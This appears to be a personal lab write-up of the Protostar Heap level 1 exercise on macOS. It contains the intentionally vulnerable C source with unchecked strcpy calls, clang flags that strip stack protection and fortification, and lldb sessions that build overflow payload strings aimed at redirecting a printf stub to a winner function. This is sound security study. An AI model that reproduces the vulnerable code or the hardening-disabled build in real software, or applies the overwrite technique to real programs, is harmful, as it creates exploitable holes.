# Heap Overflow level 1
## Using lldb to understand Protostar Heap Overflow level 1
#### Inspiration
1. https://www.youtube.com/watch?v=TfJrU95q1J4&t=339s
2. http://liveoverflow.com/binary_hacking/protostar/heap1.html


##### Summary
This tutorial was originally simple; due to no **Input Validation** or **Overflow Protection** we managed to overwrite the `instruction pointer` to a function of our choice.  The inspiration articles were written on Linux.  Getting this to work on macOS was a different animal.  By default the compiler `Clang` added safety flags.  You had to turn off these flags.   Each flag is brilliantly described in the following articles:

https://blog.quarkslab.com/clang-hardening-cheat-sheet.html

https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/BufferOverflows.html

##### Compile for Heap overflow
```
clang -fno-stack-protector -fno-sanitize=cfi -fno-sanitize=safe-stack -fno-PIE main.c -D_FORTIFY_SOURCE=0 -o hitme

(lldb) settings show target.disable-aslr
target.disable-aslr (boolean) = true
```

#### Source code
The goal was to call the `winner` function by overflowing `Heap Memory` until you controlled the `Instruction Pointer`.
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>


struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```
#### First let's re-compile the C code
If the source was compiled with xCode it has default protections, with a C project.  The Clang flags auto add stack protections.  Why do these only appear to get added sometimes?  Well consider the Struct introduced in the source code.  It has a char* inside of the struct and that causes the compiler to default to adding the guard.
```
OTHER_CFLAGS = -fno-stack-protector
```
#### Start analysis
```
=> lldb
[+] Rusty Magnet's commands successfully added

(lldb) file c_playground
Current executable set to 'c_playground' (x86_64).
```
#### Crash
You immediately get a crash.
```
(lldb) frame info
frame #0: 0x00007fff71918232 libsystem_c.dylib` strlen  + 18

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x00007fff71918232 libsystem_c.dylib` strlen  + 18
    frame #1: 0x00007fff71928b62 libsystem_c.dylib` stpcpy  + 24
    frame #2: 0x00007fff71998dd9 libsystem_c.dylib` __strcpy_chk  + 24
    frame #3: 0x0000000100000f0a c_playground_exploits` main(argc=2, argv=0x00007ffeefbff8e0)  + 170 at main.c:30
    frame #4: 0x00007fff718c8015 libdyld.dylib` start  + 1
```
It appears to be caused by a strlen pointing to 0x0.  A missed Command Line argument!

In the crash it tells you a register to look for:
```
libsystem_c.dylib`strlen:
->  0x7fff71918232 <+18>: pcmpeqb xmm0, xmmword ptr [rdi]
```
Print the first register
```
(lldb) po $arg1
0

//arg1 is a really useful shortcut, just in case you move between Intel and Arm
```
#### Breakpoint the crashing line
```
(lldb) b 0x7fff71918232

(lldb) run AAAA

(lldb) register read $arg1
     rdi = 0x00007ffeefbffee0

but it called a second time.
```
#### Modify Command Line Arguments
```
(lldb) settings show target.run-args
target.run-args (array of strings) =
  [0]: "AAAA"

(lldb) setting set target.run-args "AAAA" "BBBB"

lldb) settings remove target.run-args 0
```
#### Re-Run with two args and a breakpoint
Add a breakpoint here:
```
printf("and that's a wrap folks!\n");
b printf
// note some compiler may optimise this line to the put() API

(lldb) bt
Backtrace will show the frames that are relevant.  Frame 0.

(lldb) frame select 1
frame #1: 0x0000000100000f1c c_playground_exploits` main(argc=3, argv=0x00007ffeefbff8d0)  + 188 at main.c:32

(lldb) p i1->name
(char *) $9 = 0x0000000100300010 "AAAA"

(lldb) p i2->name
(char *) $10 = 0x0000000100300030 "BBBB"

(lldb) mem read -c8 i2->name
0x100484df0: 42 42 42 42 00 00 00 00                          BBBB....

(lldb) mem read -c8 0x100484df0
0x100484df0: 42 42 42 42 00 00 00 00                          BBBB....
```
#### Try a Heap Overflow...
We have seen the source code.  We can also see from disas+
```
(lldb) run AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444

Process 70564 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x47474747)
    frame #0: 0x00007fff71bd9fad libsystem_platform.dylib` _platform_memmove$VARIANT$Haswell  + 141
libsystem_platform.dylib`_platform_memmove$VARIANT$Haswell:
->  0x7fff71bd9fad <+141>: vmovups xmmword ptr [rdi], xmm0
```
So we have overwritten the Instruction Pointer with GGGG.  
#### Find the Function to invoke
```
(lldb) image list -b
[  0] c_playground_exploits

(lldb) image dump symtab -m c_playground_exploits
If you don't limit the dump, you will be overwhelmed.

winner()
```
The slicker way..
```
(lldb) image lookup -rn winner
1 match found in /Users/rusty_magneto/Security/app_binaries/c_playground_exploits:
        Address: c_playground_exploits[0x0000000100000e30]
```
#### Set the run arguments
Now we we want to overwrite the value that is reference in libC.  So instead of calling `printf()` it called the `winner()` function.

`settings set target.run-args "AAAABBBBCCCCDDDDEEEEFFFGGGG" "0000111122223333444455556666"`

Note -> There is definitely a caching feature on lldb I can't figure out.  You have to run the exploit string twice to get the expected crash.

#### Use the Heap to set pointer
```
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x100474747)

(lldb) register read $rdi
     rdi = 0x0000000100474747
```
Notice I made an error.  I was missing an "F" and also had an erroneous 1 in my sequence of number characters.
```
settings set target.run-args "AAAABBBBCCCCDDDDEEEEFFFFGGGG" "0000111122223333444455556666"

* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x47474747)
```
##### Setup strings for the Heap Overflow
You have to specify the bytes in **`Little endian`** format.
```
B=$(printf "AAAABBBBCCCCDDDDEEEEFFFF\x68\x0f\x00\x00")
C=$(printf "\x30\x0e\x00\x00GGGGGGGG")
lldb hitme $B $C
```
This shoulds like it was smooth sailing.  It was not.  What I learned: just because lldb can't display the characters, you can still use them!  Don't believe `settings show target.run-args`

```
(lldb) settings show target.run-args
target.run-args (array of strings) =
  [0]: "AAAABBBBCCCCDDDDEEEEFFFFAAA"
  [1]: "AAAABBBBCCCCDDDDEEEEFFFFAAA"
```
##### Progress!
Crashes here:
```
0x7fff62658fd0
EXC_BAD_ACCESS (code=1, address=0x41414141)
EXC_BAD_ACCESS (code=2, address=0x100000e30)

Code = 1 is KERN_INVALID_ADDRESS and code = 2 is KERN_PROTECTION_FAILURE
```

##### Global Offset table
This attack does not target the obvious patches of registers.  Rather - as `printf` is called from a dynamic library, you modify the Global Offset table to point to `winner` instead of `printf`.

```
settings set target.x86-disassembly-flavor intel
(lldb) disassemble --name main

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x100000e30)
    frame #3: 0x0000000100000f0a c_playground_exploits` main(argc=3, argv=0x00007ffeefbff898)  + 170 at main.c:30

Or by address:

(lldb) dis -s 0x0000000100000f0a
c_playground_exploits`main:
    0x100000f0a <+170>: lea    rdi, [rip + 0x87]         ; "and that's a wrap folks!\n"
    0x100000f11 <+177>: mov    qword ptr [rbp - 0x38], rax
    0x100000f15 <+181>: mov    al, 0x0
    0x100000f17 <+183>: call   0x100000f38               ; symbol stub for: printf


(lldb) image lookup --address 0x100000f38
      Address: c_playground_exploits[0x0000000100000f38] (c_playground_exploits.__TEXT.__stubs + 12)
      Summary: c_playground_exploits`symbol stub for: printf

(lldb) disas -s 0x0000000100000f38
c_playground_exploits`printf:
    0x100000f38 <+0>: jmp    qword ptr [rip + 0xe2]    ; (void *)0x0000000100000f68

(lldb) image lookup --address 0x0000000100000f68
      Address: c_playground_exploits[0x0000000100000f68] (c_playground_exploits.__TEXT.__stub_helper + 36)

```

##### Sidenote - how to echo a load of characters to lldb?
In gdb you can use the `echo` or `perl` commands.

```
perl -e 'print "A" x 24'
echo -n -e 'AAAA\x66\x6f\x6f'
```
